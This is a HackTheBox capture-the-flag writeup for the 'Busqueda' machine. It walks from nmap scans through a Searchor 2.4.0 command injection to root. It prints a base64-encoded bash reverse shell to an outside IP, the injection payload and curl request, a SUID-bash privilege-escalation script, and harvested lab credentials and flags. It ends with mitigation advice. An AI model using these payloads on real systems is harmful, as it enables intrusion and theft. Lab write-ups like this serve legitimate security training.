# Busqueda - HackTheBox Writeup

## Overview

Busqueda is a Linux-based machine from HackTheBox that involves exploiting a vulnerable web application, leveraging Git configuration exposure, and abusing sudo privileges to escalate to root access.

## Reconnaissance

### Initial Nmap Scan
```bash
export target=10.129.16.87
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="449" height="160" alt="image" src="https://github.com/user-attachments/assets/5804df0e-666b-4002-9e20-2f82959f89b4" />

<img width="723" height="212" alt="image" src="https://github.com/user-attachments/assets/8d11256c-f59b-4b39-92e9-799eebc7c9c8" />

**Results:**
- Discovered open ports: **22 (SSH)** and **80 (HTTP)**

### Service Version Detection
```bash
sudo nmap -sC -sV -p 22,80 -T4 $target
```

<img width="762" height="337" alt="image" src="https://github.com/user-attachments/assets/f8a1773c-d024-4c0e-bafe-a395be4197b8" />

**Detailed Findings:**
- **Port 22**: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- **Port 80**: Apache httpd 2.4.52 ((Ubuntu))

### Web Application Enumeration
Added the domain to hosts file:
```bash
sudo nano /etc/hosts
# Add: 10.129.16.87 searcher.htb
```

Visited `http://searcher.htb` and discovered:
- **Software**: Searchor version 2.4.0
- **Functionality**: Search engine aggregation tool

<img width="948" height="977" alt="image" src="https://github.com/user-attachments/assets/71694e0a-1be9-4edc-a79f-3861fd2dd8b6" />

### Testing Search Functionality
- Selected Google as search engine
- Query "hello" returned: `https://www.google.com/search?q=hello`
- Application reflected search results in a new webpage

<img width="428" height="110" alt="image" src="https://github.com/user-attachments/assets/88cf8347-664b-4656-8ad5-6043a5ac0bcb" />

## Initial Access

### Vulnerability Research
Researched Searchor 2.4.0 exploits and found:
- **CVE**: Arbitrary Command Injection vulnerability
- **Reference**: [Exploit-for-Searchor-2.4.0](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

### Reverse Shell Preparation
```bash
# Generate base64 encoded reverse shell
echo -ne "bash -c 'bash -i >& /dev/tcp/10.10.14.172/4444 0>&1'" | base64
# Output: YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzQ0NDQgMD4mMSc=
```

<img width="629" height="79" alt="image" src="https://github.com/user-attachments/assets/728fd3ea-c9f7-4e8d-984f-ea268714f317" />


### Craft Exploit Payload
```bash
evil_cmd="',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzQ0NDQgMD4mMSc= | base64 -d | bash -i')) # junky comment"
```

<img width="949" height="237" alt="image" src="https://github.com/user-attachments/assets/d4eee6ca-aaf7-41f1-b2ea-f35a2933d844" />

### Start Netcat Listener
```bash
nc -nlvp 4444
```

### Execute Exploit
```bash
curl -s -X POST http://searcher.htb/search -d "engine=Google&query=${evil_cmd}"
```

### Shell Obtained
Successfully received reverse shell connection as user `svc`

<img width="637" height="942" alt="image" src="https://github.com/user-attachments/assets/da778b00-dc69-451a-9d47-a76352639132" />

## Privilege Escalation

### Initial Enumeration
```bash
whoami
# svc

pwd
# /var/www/app

ls -la
```

### Discover Git Configuration
```bash
cat /var/www/app/.git/config
```

<img width="710" height="371" alt="image" src="https://github.com/user-attachments/assets/31d5c33d-d314-4d42-9cd6-aa3c31b8c94c" />

**Found Credentials:**
```
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

### Add Gitea to Hosts
```bash
echo "10.129.16.87 gitea.searcher.htb" >> /etc/hosts
```

### Access Gitea
- URL: `http://gitea.searcher.htb`
- Credentials: `cody:jh1usoih2bkjaspwe92`
- Successfully logged into Gitea instance

with codys creds we can login to http://gitea.searcher.htb/user/login?redirect_to=%2f

<img width="953" height="533" alt="image" src="https://github.com/user-attachments/assets/e70db74c-80f5-4a86-8538-7e9471712299" />

<img width="802" height="981" alt="image" src="https://github.com/user-attachments/assets/d81cf9e1-de99-46bb-83d7-9c8dafcdbd7d" />


### Check Sudo Privileges
```bash
sudo -l
```
Note:Use codys' password
<img width="754" height="175" alt="image" src="https://github.com/user-attachments/assets/e1ab228f-2c9b-4ec6-9413-fe9373bf79c1" />

**Output:**
```
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

### Analyze System-Checkup Script
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py ara
```

**Script Usage:**
```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inspect a certain docker container
     full-checkup  : Run a full system checkup
```

### Enumerate Docker Containers
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

<img width="959" height="175" alt="image" src="https://github.com/user-attachments/assets/9ee9e961-5827-4704-988e-a46285f16dbd" />

**Results:**
```
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 53 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 53 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

### Inspect Gitea Container for Credentials
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
```
<img width="581" height="222" alt="image" src="https://github.com/user-attachments/assets/54ee3014-9d49-474e-ac9f-f9b3f29a9cc3" />

**Extracted Database Credentials from Environment:**
```json
"Env": [
  "USER_UID=115",
  "USER_GID=121", 
  "GITEA__database__DB_TYPE=mysql",
  "GITEA__database__HOST=db:3306",
  "GITEA__database__NAME=gitea",
  "GITEA__database__USER=gitea",
  "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
]
```

### Get MySQL Container IP
```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
```

<img width="955" height="376" alt="image" src="https://github.com/user-attachments/assets/6da02fd2-8068-4d04-933c-20b51824b031" />

**Network Information:**
```json
{
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "c7fbd5f328719c833cbc947cae5b3244d831e7b010f5ef34881b483a8e6f65be",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```

### Access MySQL Database
```bash
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```

<img width="660" height="572" alt="image" src="https://github.com/user-attachments/assets/d9ab3df2-6a82-4b75-b6e6-61830cf25bdc" />

### Extract User Information
```sql
select * from users \G;
```

<img width="951" height="787" alt="image" src="https://github.com/user-attachments/assets/85e15867-0150-422a-937b-7f3d013c5f14" />

**Found Administrator Hash:**
```
ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
```

### Password Reuse Check
Discovered that the database password `yuiu1hoiu4i5ho1uh` was reused for the administrator account.

### Analyze Scripts Repository
Examined scripts in the Gitea repository maintained by administrator.

### Exploit Full-Checkup Vulnerability
Discovered that `full-checkup` executes scripts from current directory with root privileges.

<img width="951" height="890" alt="image" src="https://github.com/user-attachments/assets/8c883a57-d7ff-4327-8bd9-582b6e6c8924" />

**Create Exploit Script:**
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/path\nchmod 4777 /tmp/path' > full-checkup.sh
chmod +x full-checkup.sh
```

<img width="928" height="145" alt="image" src="https://github.com/user-attachments/assets/ee595de3-8347-44a6-b5a1-b391176b9ae1" />

### Execute Privilege Escalation
```bash
sudo python3 /opt/scripts/system-checkup.py full-checkup
```

### Gain Root Access
```bash
/tmp/path -p
```

**Verify Root Privileges:**
```bash
id
whoami
hostname
uname -r
```


<img width="638" height="201" alt="image" src="https://github.com/user-attachments/assets/f27221c3-1fa7-464f-8ded-34b29916c56c" />

## Flag Collection

### User Flag
```bash
cat /home/svc/user.txt
```
**User Flag:** `bfb79950c22bba32320a294953bbf4c2`

### Root Flag
```bash
cat /root/root.txt
```
**Root Flag:** `e3f07a7de0fc9535337534b7b01bdabd`

## Conclusion

### Attack Path Summary:
1. **Information Gathering**: Nmap scans revealed SSH and HTTP services
2. **Web Application Analysis**: Discovered Searchor 2.4.0 vulnerable to command injection
3. **Initial Compromise**: Exploited command injection to gain reverse shell as `svc` user
4. **Lateral Movement**: Found Git credentials leading to Gitea access
5. **Privilege Escalation**: 
   - Abused sudo permissions to run system-checkup script
   - Extracted database credentials from Docker container
   - Discovered password reuse
   - Exploited full-checkup functionality to gain root access

### Security Issues Identified:
- Vulnerable web application (Searchor 2.4.0)
- Exposed credentials in Git configuration
- Password reuse across services
- Sudo misconfiguration allowing script execution as root
- Insecure script execution in full-checkup functionality

### Mitigation Recommendations:
- Update Searchor to latest version
- Implement proper credential management
- Avoid password reuse across services
- Restrict sudo permissions to minimum required
- Sanitize script execution in administrative tools

---
*This writeup documents the complete penetration testing process for educational purposes. Always ensure you have proper authorization before testing systems.*
